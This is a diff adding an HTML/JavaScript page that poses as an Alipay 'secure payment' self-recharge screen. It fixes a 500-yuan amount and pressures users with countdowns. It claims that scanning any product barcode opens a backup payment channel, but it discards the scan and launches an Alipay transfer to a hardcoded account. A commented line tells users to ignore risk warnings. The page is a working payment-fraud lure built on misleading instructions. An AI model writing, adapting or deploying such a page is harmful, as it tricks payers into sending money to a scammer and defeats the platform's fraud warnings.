@@ -1,0 +1,278 @@
+
+<html>
+<head>
+    <title>安全支付</title>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <script type="text/javascript" src="jquery.min.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+    <style type="text/css">
+        body {
+            padding: 0;
+            margin: 0;
+            background-color: #098EE9;
+            font-family: "microsoft yahei";
+        }
+
+        .pay-main {
+            background-color: #098EE9;
+            padding-top: 20px;
+            padding-left: 20px;
+            padding-bottom: 20px;
+        }
+
+        .pay-main img {
+            margin: 0 auto;
+            display: block;
+            width: 50px;
+            margin-top: 20px;
+        }
+
+        .pay-main .lines {
+            margin: 0 auto;
+            text-align: center;
+            color: #fff;
+            font-size: 12pt;
+            margin-top: 10px;
+        }
+
+        .tips .img {
+            margin: 10px;
+        }
+
+        .tips .img img {
+            width: 20px;
+        }
+
+        .tips span {
+            vertical-align: top;
+            color: #1e9fff;
+            padding-left: 10px;
+            padding-top: 0px;
+        }
+
+        .action {
+            background: #fff;
+            padding: 10px 0;
+            color: #098EE9;
+            text-align: center;
+            font-size: 14pt;
+            border-radius: 10px 10px;
+            margin: 10px;
+        }
+
+        .action:focus {
+            background: #4cb131;
+        }
+
+        .action.disabled {
+            background-color: #aeaeae;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding-bottom: 20px;
+            font-size: 10pt;
+            color: #aeaeae;
+        }
+
+        .footer .ct-if {
+            margin-top: 6px;
+            font-size: 8pt;
+        }
+
+        .jieguo {
+            top: 20px;
+            line-height: 26px;
+            max-width: 260px;
+            padding: 8px 20px;
+            margin: 0 auto;
+            position: relative;
+            border: 1px #ddd dashed;
+            box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .text {
+            font-size: 16px;
+            font-weight: bold;
+            color: #f9f900;
+        }
+    </style>
+</head>
+<body onload="closeWindow();">
+<div class="conainer">
+    <div class="pay-main">
+        <img src="pay_logo.png" width="20px">
+        <div class="lines"><span id="tips"></span></div>
+    </div>
+    <div class="tips">
+        <div class="img">
+            <p style="text-align:center;color:#fff">应转：<b style="color:#ff0">500.00</b>元，修改金额不到账</p>
+        </div>
+    </div>
+    <div style="margin-top: 10px; color: #fff;text-align:center;" id="ios-tips" class="tips">
+        <p>如果下方第一个支付通道有异常，可选择备用支付，点击后摄像头会自动弹出，直接扫描您身边的<font color="#f00"><b>任意商品</b></font>二维码或条形码即可跳转</p>
+        <p><b style="color:#ff0">如：烟盒上的条形码</b></p>
+        <p><b style="color:#ff0">如：零食上的条形码</b></p>
+        <p><b style="color:#ff0">如：饮料上的条形码</b></p>
+        <p><b style="color:#ff0">如：纸巾上的条形码</b></p>
+        <p><b style="color:#ff0">如：相册里的二维码</b></p>
+        <!--<p class="STYLE4">3.若提示“本次交易存在风险”，请点击继续付款。</p>-->
+    </div>
+
+    <!-- <div id="okpay" class="action">安全检查中...</div>-->
+    <div id="okpay1" class="action">异常支付请看说明</div>
+
+    <div class="footer">
+        <div class="ct-if"></div>
+    </div>
+
+    <div id="appexit" class="action disabled " style="display:none;">关闭页面</div>
+    <div class="footer">
+        <div class="ct-if"></div>
+    </div>
+
+    <script>
+        var time = 3;
+        function closeWindow() {
+            window.setTimeout('closeWindow()', 1000);
+            if (time > 0) {
+                document.getElementById("tips").innerHTML = "请注意：<b><font color=#ff0>" + time + "</font><b> 秒内支付有效";
+                time--;
+            } else {
+                window.opener = null; //关闭窗口时不出现提示窗口
+                //window.close();
+                window.location.href = "#";
+            }
+        }
+    </script>
+    <script>
+        //导航栏颜色
+        AlipayJSBridge.call("setTitleColor", {
+            color: parseInt('098EE9', 16),
+            reset: false // (可选,默认为false)  是否重置title颜色为默认颜色。
+        });
+        //导航栏loadin
+        AlipayJSBridge.call('showTitleLoading');
+        //副标题文字
+        AlipayJSBridge.call('setTitle', {
+            title: '自助充值',
+            subtitle: '安全支付'
+        });
+        //右上角菜单
+        AlipayJSBridge.call('setOptionMenu', {
+            icontype: 'filter',
+            redDot: '01', // -1表示不显示，0表示显示红点，1-99表示在红点上显示的数字
+        });
+        AlipayJSBridge.call('showOptionMenu');
+        document.addEventListener('optionMenu', function (e) {
+            AlipayJSBridge.call('showPopMenu', {
+                menus: [{
+                    name: "查看帮助",
+                    tag: "tag1",
+                    redDot: "1"
+                },
+                    {
+                        name: "联系客服",
+                        tag: "tag2",
+                    }
+                ],
+            }, function (e) {
+                console.log(e);
+            });
+        }, false);
+
+
+        userid = "2088732000517869";
+        money = "500.00";
+        mark = "D214854875178879";
+
+        function goJsPay() {
+            //userid = "2088732000517869";
+            //money = "500.00";
+            try {
+                var a = {
+                    actionType: "scan",
+                    u: userid,
+                    a: money,
+                    m: mark,
+                    biz_data: {
+                        s: "money",
+                        u: userid,
+                        a: money,
+                        m: mark
+                    }
+                }
+            } catch (b) {
+                returnApp()
+            }
+            AlipayJSBridge.call("startApp", {
+                appId: "20000123",
+                param: a
+            }, function (a) {})
+        }
+
+        if (typeof AlipayJSBridge == 'undefined') {
+            //window.location.href = 'https://auth.alipay.com/login/index.htm';
+            throw new Error('error.')
+        }
+
+        document.addEventListener('resume', function (a) {
+        });
+
+        function ready(a) {
+            window.AlipayJSBridge ? a && a() : document.addEventListener('AlipayJSBridgeReady', a, !1)
+        }
+
+        ready(function () {
+            timer(10);
+        });
+        function timer(intDiff) {
+            var timer1 = window.setInterval(function () {
+                var second = Math.floor(intDiff);
+                if (second == 0) {
+
+                    //  $("#okpay").html("点击开始支付");
+                    $("#okpay1").html("备用支付通道");
+                    $("#okpay").bind("click", function () {
+                        goJsPay();
+                    });
+                    $("#okpay1").bind("click", function () {
+                        goPay();
+                    });
+                    //goAliPay();
+                    clearInterval(timer1);
+                } else {
+                    if (second <= 9)
+                        second = '0' + second;
+                    $('#okpay').html('请仔细阅读说明，' + second + '秒后可支付');
+                }
+                intDiff--;
+            }, 100);
+        }
+        function goPay() {
+            alert("温馨提示：请直接扫描您身边任意商品（香烟、饮料、零食等）包装上的条形码或二维码，即可跳转支付界面。");
+            setTimeout(function () {
+                scanQR();
+            }, 50);
+        }
+        function scanQR() {
+            ap.scan(function (res) {
+                setTimeout(function () {
+                    goJsPay();
+                }, 200);
+            });
+        }
+
+    </script>
+
+</div>
+</body>
+</html>
